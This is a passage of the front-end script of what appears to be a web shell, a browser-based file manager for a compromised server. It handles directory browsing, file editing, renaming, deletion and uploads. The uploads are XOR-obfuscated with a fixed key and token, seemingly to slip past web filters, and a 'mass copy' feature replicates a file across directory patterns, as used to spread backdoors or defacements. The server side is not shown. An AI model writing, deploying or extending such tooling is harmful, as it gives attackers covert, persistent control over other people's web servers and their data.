    document.getElementById('fileList').innerHTML = r.html;
    updateBreadcrumbs();
}

function navigateTo(dir) {
    if (event && (event.ctrlKey || event.metaKey)) { window.open(location.pathname + '?dir=' + encodeURIComponent(dir), '_blank'); return; }
    document.getElementById('fileList').innerHTML = '<div class="empty-state"><div class="spinner"></div></div>';
    postReq('list', {dir}).then(r => { if(r.success) updateUI(r); else { showStatus('Failed to load directory', false); refreshList(); } }).catch(e => { showStatus(e.message, false); refreshList(); });
}

function updateBreadcrumbs() {
    const c = document.getElementById('breadcrumbs'), n = currentDir.replace(/\\/g, '/').split('/'), h = ['<span class="path-root">~/</span>'];
    let cum = '';
    n.forEach((p, i) => {
        cum += (i === 0 ? '' : '/') + p;
        if (i > 0) h.push('<span class="path-sep">/</span>');
        if (i === n.length - 1) h.push('<span class="path-current">' + esc(p) + '</span>');
        else h.push('<a href="#" onclick="navigateTo(\'' + esc(cum).replace(/'/g, "\\'") + '\');return false;" class="path-link">' + esc(p) + '</a>');
    });
    c.innerHTML = h.join('');
}

function refreshList() { postReq('list', {dir: currentDir}).then(r => updateUI(r)).catch(() => {}); }

function editFile(p) {
    editFilePath = p; document.getElementById('editFileName').textContent = p.split('/').pop().split('\\').pop();
    document.getElementById('editContent').value = 'Loading...'; openModal('editModal');
    fetch(SELF + '?action=fetch&path=' + encodeURIComponent(p)).then(r => r.json()).then(r => {
        if (r.success) document.getElementById('editContent').value = r.content; else { showStatus(r.message, false); closeModal('editModal'); }
    }).catch(() => { showStatus('Failed to read file', false); closeModal('editModal'); });
}

function saveFile() {
    postReq('edit', {path: editFilePath, content: document.getElementById('editContent').value}).then(r => {
        showStatus(r.message, r.success); if (r.success) { updateUI(r); closeModal('editModal'); }
    });
}

function renameFile(p, n) {
    renameFilePath = p; document.getElementById('renameOldName').value = n;
    document.getElementById('renameNewName').value = n; openModal('renameModal');
    setTimeout(() => { const i = document.getElementById('renameNewName'); i.focus(); i.select(); }, 100);
}

function confirmRename() {
    const n = document.getElementById('renameNewName').value.trim();
    if (!n) { showStatus('Name cannot be empty', false); return; }
    postReq('rename', {oldpath: renameFilePath, newname: n}).then(r => {
        showStatus(r.message, r.success); if (r.success) { updateUI(r); closeModal('renameModal'); }
    });
}

function deleteFile(p, n) { deleteFilePath = p; document.getElementById('deleteFileName').textContent = n; openModal('deleteModal'); }

function confirmDelete() {
    postReq('delete', {path: deleteFilePath}).then(r => {
        showStatus(r.message, r.success); if (r.success) { updateUI(r); closeModal('deleteModal'); }
    });
}

function openUploadModal() {
    selectedFile = null; document.getElementById('fileInput').value = '';
    document.getElementById('uploadFileName').textContent = 'No file selected';
    document.getElementById('uploadBtn').disabled = true; document.getElementById('uploadProgress').style.display = 'none';
    openModal('uploadModal');
}

function handleFileSelect(inp) {
    if (inp.files && inp.files.length > 0) {
        selectedFile = inp.files[0];
        document.getElementById('uploadFileName').textContent = selectedFile.name + ' (' + fmtSize(selectedFile.size) + ')';
        document.getElementById('uploadBtn').disabled = false;
    }
}

const ua = document.getElementById('uploadArea');
ua.addEventListener('dragover', e => { e.preventDefault(); ua.classList.add('over'); });
ua.addEventListener('dragleave', () => { ua.classList.remove('over'); });
ua.addEventListener('drop', e => {
    e.preventDefault(); ua.classList.remove('over');
    if (e.dataTransfer.files.length > 0) {
        selectedFile = e.dataTransfer.files[0];
        document.getElementById('uploadFileName').textContent = selectedFile.name + ' (' + fmtSize(selectedFile.size) + ')';
        document.getElementById('uploadBtn').disabled = false;
    }
});

async function uploadFile() {
    if (!selectedFile) return;
    const btn = document.getElementById('uploadBtn'), pd = document.getElementById('uploadProgress'), pb = document.getElementById('progBar'), pt = document.getElementById('progText');
    btn.disabled = true; btn.innerHTML = '<div class="spinner"></div>'; pd.style.display = 'block'; pb.style.width = '0%';
    try {
        pt.textContent = 'Reading file...';
        const b64 = await new Promise((res, rej) => { const r = new FileReader(); r.onload = () => res(r.result.split(',')[1]); r.onerror = () => rej({message:'Read failed'}); r.readAsDataURL(selectedFile); });
        pb.style.width = '25%'; pt.textContent = 'Generating hash...';
        const hash = await sha256(b64);
        pb.style.width = '45%'; pt.textContent = 'Encrypting...';
        const xored = xorEncode(b64, XOR_KEY);
        pb.style.width = '70%'; pt.textContent = 'Uploading...';
        const result = await new Promise((res, rej) => {
            const xhr = new XMLHttpRequest(), fd = new FormData();
            fd.append('action','upload'); fd.append('token',UPLOAD_TOKEN); fd.append('filename',selectedFile.name);
            fd.append('filesize',selectedFile.size.toString()); fd.append('datahash',hash); fd.append('data',xored); fd.append('dir',currentDir);
            xhr.open('POST', SELF, true);
            xhr.upload.onprogress = e => { if(e.lengthComputable){ const p=70+(e.loaded/e.total)*30; pb.style.width=p+'%'; pt.textContent='Uploading... '+Math.round(p)+'%'; }};
            xhr.onreadystatechange = () => { if(xhr.readyState===4){ if(xhr.status===200){ try{res(JSON.parse(xhr.responseText));}catch(e){rej({message:'System error'});} }else rej({message:'Network error'}); } };
            xhr.onerror = () => rej({message:'Connection lost'});
            xhr.send(fd);
        });
        pb.style.width = '100%'; pt.textContent = 'Complete';
        showStatus(result.message, result.success);
        if (result.success) { updateUI(result); setTimeout(() => closeModal('uploadModal'), 400); }
    } catch(e) { console.error(e); showStatus(e.message || 'Upload failed', false); }
    finally { btn.innerHTML = 'Upload'; btn.disabled = false; setTimeout(() => { pd.style.display = 'none'; }, 2000); }
}

function openMassCopyModal() {
    document.getElementById('massCopySource').value = ''; document.getElementById('massCopyPattern').value = '';
    document.getElementById('massCopyResults').style.display = 'none'; openModal('massCopyModal');
}

function executeMassCopy() {
    const s = document.getElementById('massCopySource').value.trim(), p = document.getElementById('massCopyPattern').value.trim();
    if (!s || !p) { showStatus('Please fill in both fields', false); return; }
    postReq('masscopy', {source: s, pattern: p}).then(r => {
        document.getElementById('massCopyResults').style.display = 'block';
        document.getElementById('massCopyOutput').textContent = r.output;
        showStatus(r.success ? 'Copy completed' : 'Some copies failed', r.success);
    });
}

document.getElementById('renameNewName').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); confirmRename(); } });
document.getElementById('massCopyPattern').addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); executeMassCopy(); } });

updateBreadcrumbs();
</script>
</body>
</html>
